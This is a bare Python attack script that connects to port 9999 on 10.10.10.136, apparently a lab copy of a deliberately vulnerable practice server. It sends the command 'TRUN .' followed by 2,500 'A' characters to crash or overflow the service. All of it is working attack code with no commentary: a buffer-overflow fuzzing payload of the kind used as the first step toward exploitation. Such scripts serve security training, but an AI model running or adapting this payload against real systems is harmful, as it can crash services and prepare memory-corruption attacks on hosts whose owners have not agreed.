#!/usr/bin/env python3

import socket

s = socket.socket()
host = ("10.10.10.136")
port = 9999
cmd=("TRUN .")
fuzz=("A" * 2500)

payload=(cmd + fuzz)

try:
	s.connect((host, port))
	s.send(payload.encode())
	data = s.recv(1024).decode()
	print(data)
	s.send("QUIT".encode())
except:
	print("Something went wrong")
finally:
	s.close()
